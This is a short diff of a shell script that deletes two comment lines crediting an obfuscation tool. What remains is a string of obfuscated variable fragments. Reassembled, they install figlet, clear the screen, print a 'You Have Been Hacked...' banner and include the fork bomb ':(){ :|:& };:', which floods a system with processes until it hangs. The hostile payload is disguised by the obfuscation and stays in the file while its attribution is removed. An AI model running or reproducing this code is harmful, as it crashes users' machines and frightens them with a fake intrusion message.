@@ -1,5 +1,3 @@
-# Encrypted by K-fuscator
-# Github- https://github.com/KasRoudra/k-fuscator
 
 z="
 ";Fz='y';Nz='Been';Mz='ave ';Az='apt ';Pz='ked.';Tz=' :|:';Ez='et -';Cz='all ';Oz=' Hac';Gz='clea';Bz='inst';Kz='et Y';Lz='ou H';Iz='slee';Hz='r';Sz=':(){';Qz='..';Uz='& };';Rz='p 1';Dz='figl';Vz=':';Jz='p 2';
